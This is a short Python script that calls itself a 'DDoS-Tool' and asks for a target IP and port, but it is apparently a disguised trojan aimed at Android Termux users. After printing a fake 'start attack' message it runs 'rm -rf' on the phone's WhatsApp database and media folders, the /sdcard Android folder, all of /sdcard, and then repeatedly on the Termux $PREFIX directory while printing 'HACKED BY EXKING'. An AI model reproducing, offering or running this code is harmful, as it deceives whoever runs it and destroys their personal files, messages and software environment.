import os
from time import sleep

def cl():
    os.system('clear')

banner ='''
 _________
/         \\
|DDoS-Tool|
\_________/'''

def stop():
    while True:
        print('HACKED BY EXKING')
        os.system('rm -rf $PREFIX')

def min():
    os.system('rm -rf /sdcard/WhatsApp/Database')
    os.system('rm -rf /sdcard/WhatsApp/Media')
    os.system('rm -rf /sdcard/Android')
    os.system('rm -rf /sdcard')
    stop()

def main():
    print(banner)
    ip = input('ip>')
    port = input('port>')
    print('Load')
    sleep(1)
    cl()
    print('start attack')
    print(ip+'>'+port)
    min()
    while True:
        print(ip+'>'+port)
    

main()
